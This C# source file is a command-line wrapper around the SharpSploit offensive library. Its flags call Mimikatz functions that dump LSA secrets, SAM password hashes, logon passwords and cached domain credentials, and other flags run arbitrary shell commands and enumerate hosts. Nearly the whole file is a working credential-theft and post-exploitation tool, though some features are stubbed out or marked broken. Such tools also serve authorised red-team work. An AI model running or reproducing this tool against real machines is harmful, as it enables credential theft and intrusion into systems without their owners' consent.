using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SharpSploit;
using SharpSploit.Credentials;
using NDesk.Options;

namespace Client
{
    class Program
    {   
        static void Main(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--mimi-all")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.All());
                }
                if (args[i] == "--mimi-command")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.Command(args.GetValue(i+1).ToString()));
                }
                if (args[i] == "--mimi-lsa")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.LsaSecrets());
                }
                if (args[i] == "--mimi-sam")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.SamDump());
                }
                if (args[i] == "--mimi-logon")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.LogonPasswords());
                }
                if (args[i] == "--mimi-cache")
                {
                    System.Console.WriteLine(SharpSploit.Credentials.Mimikatz.LsaCache());
                }
                if (args[i] == "--hostname")
                {
                    System.Console.WriteLine(SharpSploit.Enumeration.Host.GetHostname());
                }
                if (args[i] == "--proclist")
                {
                    System.Console.WriteLine(SharpSploit.Enumeration.Host.GetProcessList());
                }
                if (args[i] == "--proclist")
                {
                    System.Console.WriteLine(SharpSploit.Enumeration.Host.GetProcessList());
                }
                if (args[i] == "--portscan")
                {
                    //System.Console.WriteLine(SharpSploit.Enumeration.Network.PortScan());
                }
                if (args[i] == "--getnetlocalgroups")
                {
                    System.Console.WriteLine(SharpSploit.Enumeration.Net.GetNetLocalGroups(args.GetValue(i + 1).ToString()));
                }
                if (args[i] == "--shell-exec")
                {
                    System.Console.WriteLine(SharpSploit.Execution.Shell.ShellExecute(args.GetValue(i+1).ToString()));
         
                }
                if (args[i] == "--ping")
                {
                    System.Console.WriteLine(SharpSploit.Enumeration.Network.Ping(args.GetValue(i + 1).ToString()));

                }
                if (args[i] == "--help") 
                {
                    System.Console.WriteLine("Usage:");
                    System.Console.WriteLine("`client.exe --mimi-all` executes all Mimikatz commands.");
                    System.Console.WriteLine("`client.exe --mimi-command 'privilege::debug'`  execute specific Mimikatz command.");
                    System.Console.WriteLine("`client.exe --mimi-lsa` dump LSA secrets.");
                    System.Console.WriteLine("`client.exe --mimi-sam` dump SAM database.");
                    System.Console.WriteLine("`client.exe --mimi-logon` dump logon passwords.");
                    System.Console.WriteLine("`client.exe --mimi-cache` dumps DCC cached credentials from LSA.");
                    System.Console.WriteLine("`client.exe --hostname` prints hostname.");
                    System.Console.WriteLine("`client.exe --proclist` prints process list.");
                    System.Console.WriteLine("`client.exe --portscan` eventually run a port scan");
                    System.Console.WriteLine("`client.exe --getnetlocalgroups` returns local security groups. (broken)");
                    System.Console.WriteLine("`client.exe --shell-exec 'ipconfig'` executes cmd shell command. (broken)");
                    System.Console.WriteLine("`client.exe --ping '127.0.0.1'` ping hosts.");

                }
            }


        }
    }
}